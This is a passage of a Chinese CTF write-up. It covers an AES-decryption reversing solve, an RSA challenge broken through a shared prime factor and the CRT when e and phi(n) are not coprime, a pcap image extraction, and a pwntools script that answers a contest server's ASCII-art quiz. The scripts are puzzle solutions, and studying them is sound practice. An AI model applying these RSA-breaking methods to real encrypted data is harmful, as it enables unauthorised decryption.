class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">import binascii  	  </span><br><span class="line">	inv_s_box = (  </span><br><span class="line">	    0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,  </span><br><span class="line">	    0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,  </span><br><span class="line">	    0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,  </span><br><span class="line">	    0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,  </span><br><span class="line">	    0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,  </span><br><span class="line">	    0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,  </span><br><span class="line">	    0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,  </span><br><span class="line">	    0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,  </span><br><span class="line">	    0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,  </span><br><span class="line">	    0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,  </span><br><span class="line">	    0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,  </span><br><span class="line">	    0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,  </span><br><span class="line">	    0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,  </span><br><span class="line">	    0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,  </span><br><span class="line">	    0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,  </span><br><span class="line">	    0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,  </span><br><span class="line">	)  </span><br><span class="line">	  </span><br><span class="line">	def inv_sub_bytes(s):  </span><br><span class="line">	    for i in range(4):  </span><br><span class="line">	        for j in range(4):  </span><br><span class="line">	            s[i][j] = inv_s_box[s[i][j]]  </span><br><span class="line">	  </span><br><span class="line">	def add_round_key(s, k):  </span><br><span class="line">	    for i in range(4):  </span><br><span class="line">	        for j in range(4):  </span><br><span class="line">	            s[i][j] ^= k[i][j]  </span><br><span class="line">	  </span><br><span class="line">	def inv_shift_rows(s):  </span><br><span class="line">	    s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1]  </span><br><span class="line">	    s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]  </span><br><span class="line">	    s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3]  </span><br><span class="line">	  </span><br><span class="line">	xtime = lambda a: (((a &lt;&lt; 1) ^ 0x1B) &amp; 0xFF) if (a &amp; 0x80) else (a &lt;&lt; 1)  </span><br><span class="line">	  </span><br><span class="line">	def mix_single_column(a):  </span><br><span class="line">	    # see Sec 4.1.2 in The Design of Rijndael  </span><br><span class="line">	    t = a[0] ^ a[1] ^ a[2] ^ a[3]  </span><br><span class="line">	    u = a[0]  </span><br><span class="line">	    a[0] ^= t ^ xtime(a[0] ^ a[1])  </span><br><span class="line">	    a[1] ^= t ^ xtime(a[1] ^ a[2])  </span><br><span class="line">	    a[2] ^= t ^ xtime(a[2] ^ a[3])  </span><br><span class="line">	    a[3] ^= t ^ xtime(a[3] ^ u)  </span><br><span class="line">	  </span><br><span class="line">	  </span><br><span class="line">	def mix_columns(s):  </span><br><span class="line">	    for i in range(4):  </span><br><span class="line">	        mix_single_column(s[i])  </span><br><span class="line">	  </span><br><span class="line">	def inv_mix_columns(s):  </span><br><span class="line">	    # see Sec 4.1.3 in The Design of Rijndael  </span><br><span class="line">	    for i in range(4):  </span><br><span class="line">	        u = xtime(xtime(s[i][0] ^ s[i][2]))  </span><br><span class="line">	        v = xtime(xtime(s[i][1] ^ s[i][3]))  </span><br><span class="line">	        s[i][0] ^= u  </span><br><span class="line">	        s[i][1] ^= v  </span><br><span class="line">	        s[i][2] ^= u  </span><br><span class="line">	        s[i][3] ^= v  </span><br><span class="line">	    mix_columns(s)  </span><br><span class="line">	  </span><br><span class="line">	def bytes2matrix(text):  </span><br><span class="line">	    &quot;&quot;&quot; Converts a 16-byte array into a 4x4 matrix.  &quot;&quot;&quot;  </span><br><span class="line">	    return [list(text[i:i+4]) for i in range(0, len(text), 4)]  </span><br><span class="line">	  </span><br><span class="line">	def matrix2bytes(matrix):  </span><br><span class="line">	    &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array.  &quot;&quot;&quot;  </span><br><span class="line">	    return bytes(sum(matrix, []))  </span><br><span class="line">	  </span><br><span class="line">	def decrypt_block(ciphertext,key):  </span><br><span class="line">	    cipher_state = bytes2matrix(ciphertext)  </span><br><span class="line">	    key = bytes2matrix(key)  </span><br><span class="line">	    add_round_key(cipher_state, key)  </span><br><span class="line">	    inv_mix_columns(cipher_state)  </span><br><span class="line">	    inv_shift_rows(cipher_state)  </span><br><span class="line">	    inv_sub_bytes(cipher_state)  </span><br><span class="line">	    return matrix2bytes(cipher_state)  </span><br><span class="line">	  </span><br><span class="line">	datas = [&apos;D1E8FCB9AC4BDF4948BA54E26A282F9A&apos;, &apos;7AEB61B0A637139CD0DCE7DBDB0636F7&apos;]  </span><br><span class="line">	keys = [&apos;31ED4989D15E4889E24883E4F0505449&apos;, &apos;C7C00007400048C7C19006400048C7C7&apos;, &apos;48064000E8A7FFFFFFF4660F1F440000&apos;, &apos;B85710600055482D501060004883F80E&apos;, &apos;4889E5761BB8000000004885C074115D&apos;, &apos;BF50106000FFE0660F1F840000000000&apos;, &apos;5DC30F1F4000662E0F1F840000000000&apos;, &apos;BE50106000554881EE5010600048C1FE&apos;, &apos;034889E54889F048C1E83F4801C648D1&apos;]  </span><br><span class="line">	if __name__ == &quot;__main__&quot;:  </span><br><span class="line">	    flag = &apos;&apos;  </span><br><span class="line">	    for i in range(2):  </span><br><span class="line">	        ciphertext = binascii.unhexlify(datas[i])  </span><br><span class="line">	        for j in range(3,-1,-1):  </span><br><span class="line">	            key = binascii.unhexlify(keys[j+4*i])  </span><br><span class="line">	            ciphertext = decrypt_block(ciphertext,key)  </span><br><span class="line">	        flag += ciphertext.decode(&quot;utf-8&quot;)  </span><br><span class="line">	    print(flag)</span><br></pre></td></tr></table></figure></p>
+<h1 id="crypto-队友解出"><a href="#crypto-队友解出" class="headerlink" title="crypto(队友解出)"></a>crypto(队友解出)</h1><h2 id="AzureRSA"><a href="#AzureRSA" class="headerlink" title="AzureRSA"></a>AzureRSA</h2><p>这个题比较坑，最初的时候发现n1和n2有公因数，想和可以直接得到了p和q，然后得到(p-1)*(q-1),e一直，直接求d解密就好了，人生从此迈入顶峰……但是求出p和q之后发现e与φ(n)不互素，无法求d。题目详情：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">n1=0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723L</span><br><span class="line">e1=0xfae3aL</span><br><span class="line">c1=0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbeaL</span><br><span class="line">n2=0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63L</span><br><span class="line">e2=0x1f9eaeL</span><br><span class="line">c2=0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347L</span><br><span class="line">assert pow(flag,e1,n1)==c1</span><br><span class="line">assert pow(flag,e2,n2)==c2</span><br><span class="line">assert gcd(e1,(p1-1)*(q1-1))==14</span><br><span class="line">assert gcd(e2,(p2-1)*(q2-1))==14</span><br></pre></td></tr></table></figure></p>
+<p>遇到这种情况也还好，之前遇到过e与φ(n)不互素，且公因数是8的情况，但是用当时的脚本跑并没有跑出来，因为当时的那个数开8次方之后还是证书，但是这一次……开14次方开不出来，所以当时的脚本作废了。附上当时的脚本，说不定以后也能用上呢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line"># 当指数e和Phi(n)不互素时</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">import sympy</span><br><span class="line"></span><br><span class="line">def gcd(a,b):</span><br><span class="line">    if a &lt; b:</span><br><span class="line">        a,b = b,a</span><br><span class="line">    while b != 0:</span><br><span class="line">        tem = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = tem</span><br><span class="line">    return a</span><br><span class="line"></span><br><span class="line">def invalidExponent(p,q,e,c):</span><br><span class="line">    phiN = (p - 1) * (q - 1)</span><br><span class="line">    n = p * q</span><br><span class="line">    GCD = gcd(e, phiN)</span><br><span class="line">    if (GCD == 1):</span><br><span class="line">        return &quot;Public exponent is valid.....&quot;</span><br><span class="line">    d = inverse(e//GCD,phiN)</span><br><span class="line">    c = pow(c, d, n)</span><br><span class="line">    plaintext = sympy.root(c, GCD)</span><br><span class="line">    plaintext = long_to_bytes(plaintext)</span><br><span class="line">    return plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    p = xxx</span><br><span class="line">    q = xxx</span><br><span class="line">    e = xxx</span><br><span class="line">    c = xxx</span><br><span class="line">    plaintext = invalidExponent(p,q,e,c)</span><br><span class="line">    print plaintext</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p>
+<p>最后在比赛方提示了两次的情况下，比赛完几分钟队友做出来了。当时提示中国剩余定理，只尝试了q乘p1和q乘p2，但是没有尝试p1*p2(此情况可解出flag)附上队友risker大佬的脚本，以及<a href="http://mmmmmmlei.cn" target="_blank" rel="noopener">博客</a>：<br>结果：<br><img src="https://upload-images.jianshu.io/upload_images/11234137-3519a84b3d7914e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-3519a84b3d7914e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line">def GCRT(mi, ai):</span><br><span class="line">    # mi,ai分别表示模数和取模后的值,都为列表结构</span><br><span class="line">    assert (isinstance(mi, list) and isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[0], ai[0]</span><br><span class="line">    for (m, a) in zip(mi[1:], ai[1:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        assert (c % d == 0) #不成立则不存在解</span><br><span class="line">        K = c / d * gmpy2.invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">    return (cura % curm, curm) #(解,最小公倍数)</span><br><span class="line">n1=0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723L</span><br><span class="line">e1=0xfae3aL</span><br><span class="line">c1=0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbeaL</span><br><span class="line">n2=0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63L</span><br><span class="line">e2=0x1f9eaeL</span><br><span class="line">c2=0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347L</span><br><span class="line">p1=gmpy2.gcd(n1,n2)</span><br><span class="line">q1=n1/p1</span><br><span class="line">p2=p1</span><br><span class="line">q2=n2/p2</span><br><span class="line">d2=gmpy2.invert(e2/14,(p2-1)*(q2-1))</span><br><span class="line">d1=gmpy2.invert(e1/14,(p1-1)*(q1-1))</span><br><span class="line">m1=pow(c1,d1,n1)</span><br><span class="line">m2=pow(c2,d2,n2)</span><br><span class="line">assert pow(m1,e1/14,n1)==c1</span><br><span class="line">assert pow(m2,e2/14,n2)==c2</span><br><span class="line">y=GCRT([n1,n2],[m1,m2])</span><br><span class="line">a=y[0]</span><br><span class="line">e3=7</span><br><span class="line">d3=gmpy2.invert(e3,(q1-1)*(q2-1))</span><br><span class="line">print d3</span><br><span class="line">print libnum.n2s(gmpy2.iroot(pow(a%(q1*q2),d3,q1*q2),2)[0])</span><br></pre></td></tr></table></figure></p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="GOGOGO"><a href="#GOGOGO" class="headerlink" title="GOGOGO"></a>GOGOGO</h2><p>wireshark打开流量包，追踪一下发现有一个包里有PNG图片<br><img src="https://upload-images.jianshu.io/upload_images/11234137-050316fb9101733d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-050316fb9101733d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>保存为16进制，打开得到flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-0d21fb3954d55deb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-0d21fb3954d55deb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h2 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h2><p><img src="https://upload-images.jianshu.io/upload_images/11234137-86dc0e75482a97d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-86dc0e75482a97d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>题目很简单，二十轮的字符画识别，输入20轮即可拿flag,但是有时间限制，所以人眼识别一定来不及,图像识别，不会。<br>所以观察规律，每个字符画都是由固定的字符串组成,比如这个r和l<br><img src="https://upload-images.jianshu.io/upload_images/11234137-3e9ee25e48e4a4fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-3e9ee25e48e4a4fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>所以可以把每个字符的构成字符串单独提取出来，然后把所有可能（小写字母和数字）保存下来，然后返回对应结果即可，代码见py文件,然后打开pwntools的debug模式，最后一轮即可报错并弹出flag：<br><img src="https://upload-images.jianshu.io/upload_images/11234137-f08a9573acebe844.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-f08a9573acebe844.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">sh = remote(&quot;210.32.4.14&quot;, 13373)</span><br><span class="line">sh.recvuntil(&quot;...&quot;)</span><br><span class="line">data = sh.recvuntil(&quot;your&quot;)</span><br><span class="line">lines = data.split(&quot;\n&quot;)[:-1]</span><br><span class="line">lines = lines[2:]</span><br><span class="line">def check(char_array):</span><br><span class="line">    i = &quot;&quot;</span><br><span class="line">    for tmp in char_array:</span><br><span class="line">        i += tmp.strip()</span><br><span class="line">    </span><br><span class="line">    if &quot;.oooo.d8P&apos;`Y8b888    888888    888888    888`88b  d88&apos;`Y8bd8P&apos;&quot; in i:</span><br><span class="line">        return &quot;0&quot;</span><br><span class="line">    if &apos;&apos;&apos;.oooo..dP&quot;&quot;Y88b]8P&apos;&lt;88b.`88b.o.   .88P`8bd88P&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;3&quot;</span><br><span class="line">    if &quot;.oo888888888888888o888o&quot; in i:</span><br><span class="line">        return &quot;1&quot;</span><br><span class="line">    if &apos;&apos;&apos;.oooo..dP&quot;&quot;Y88b]8P&apos;.d8P&apos;.dP&apos;.oP     .o8888888888&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;2&quot;</span><br><span class="line">    if &quot;.o.d88.d&apos;888.d&apos;  88888ooo888oo888o888o&quot; in i:</span><br><span class="line">        return &quot;4&quot;</span><br><span class="line">    if &apos;&apos;&apos;oooooooodP&quot;&quot;&quot;&quot;&quot;&quot;&quot;d88888b.`Y88b]88o.   .88P`8bd88P&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;5&quot;</span><br><span class="line">    if &apos;&apos;&apos;.ooo.88&apos;d88&apos;d888P&quot;Ybo.Y88[   ]88`Y88   88P`88bod8&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;6&quot;</span><br><span class="line">    if &apos;&apos;&apos;oooooooood&quot;&quot;&quot;&quot;&quot;&quot;&quot;8&apos;.8&apos;.8&apos;.8&apos;.8&apos;.8&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;7&quot;</span><br><span class="line">    if &apos;&apos;&apos;.ooooo.d88&apos;   `8.Y88..  .8&apos;`88888b..8&apos;  ``88b`8.   .88P`boood8&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;8&quot;</span><br><span class="line">    if &quot;.ooooo.888&apos; `Y88.888    888`Vbood888888&apos;.88P&apos;.oP&apos;&quot; in i:</span><br><span class="line">        return &quot;9&quot;</span><br><span class="line">    if &apos;&apos;&apos;.oooo.`P  )88b.oP&quot;888d8(  888`Y888&quot;&quot;8o&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;a&quot;</span><br><span class="line">    if &apos;&apos;&apos;.o8&quot;888888oooo.d88&apos; `88b888   888888   888`Y8bod8P&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;b&quot;</span><br><span class="line">    if &apos;&apos;&apos;.ooooo.d88&apos; `&quot;Y8888888   .o8`Y8bod8P&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;c&quot;</span><br><span class="line">    if &apos;&apos;&apos;.o8&quot;888.oooo888d88&apos; `888888   888888   888`Y8bod88P&quot;&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;d&quot;</span><br><span class="line">    if &quot;.ooooo.d88&apos; `88b888ooo888888    .o`Y8bod8P&apos;&quot; in i:</span><br><span class="line">        return &quot;e&quot;</span><br><span class="line">    if &apos;.o88o.888 `&quot;o888oo888888888o888o&apos; in i:</span><br><span class="line">        return &quot;f&quot;</span><br><span class="line">    if &apos;&apos;&apos;.oooooooo888&apos; `88b888   888`88bod8P&apos;`8oooooo.d&quot;     YD&quot;Y88888P&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;g&quot;</span><br><span class="line">    if &apos;&apos;&apos;oooo`888888 .oo.888P&quot;Y88b888   888888   888o888o o888o&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;h&quot;</span><br><span class="line">    if &apos;&apos;&apos;o8o`&quot;&apos;oooo`888888888o888o&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;i&quot;</span><br><span class="line">    if &apos;&apos;&apos;o8o`&quot;&apos;oooo`888888888888888.o. 88P`Y888P&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;j&quot;</span><br><span class="line">    if &apos;&apos;&apos;oooo`888888  oooo888 .8P&apos;888888.888 `88b.o888o o888o&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;k&quot;</span><br><span class="line">    if &apos;&apos;&apos;.ooooo.d88&apos; `88b888   888888   888`Y8bod8P&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;o&quot;</span><br><span class="line">    if &quot;oo.ooooo.888&apos; `88b888   888888   888888bod8P&apos;888o888o&quot; in i:</span><br><span class="line">        return &quot;p&quot;</span><br><span class="line">    if &apos;&apos;&apos;.ooooo ood88&apos; `888888   888888   888`V8bod888888.8P&apos;&quot;&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;q&quot;</span><br><span class="line">    if &quot;oooo`888888888888888o888o&quot; in i:</span><br><span class="line">        return &quot;l&quot;</span><br><span class="line">    if &apos;&apos;&apos;ooo. .oo.  .oo.`888P&quot;Y88bP&quot;Y88b888   888   888888   888   888o888o o888o o888o&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;m&quot;</span><br><span class="line">    if &apos;&apos;&apos;ooo. .oo.`888P&quot;Y88b888   888888   888o888o o888o&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;n&quot;</span><br><span class="line">    if &apos;&apos;&apos;oooo d8b`888&quot;&quot;8P888888d888b&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;r&quot;</span><br><span class="line">    if &apos;&apos;&apos;.oooo.od88(  &quot;8`&quot;Y88b.o.  )88b8&quot;&quot;888P&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;s&quot;</span><br><span class="line">    if &apos;&apos;&apos;..o8.o888oo888888888 .&quot;888&quot;&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;t&quot;</span><br><span class="line">    if &apos;&apos;&apos;oooo  oooo`888  `888888   888888   888`V88V&quot;V8P&apos;&apos;&apos; in i:</span><br><span class="line">        return &quot;u&quot;</span><br><span class="line">    if &apos;&apos;&apos;oooo    ooo`88.  .8&apos;`88..8&apos;`888&apos;`8&apos;&apos;&apos; in i:</span><br><span class="line">        return 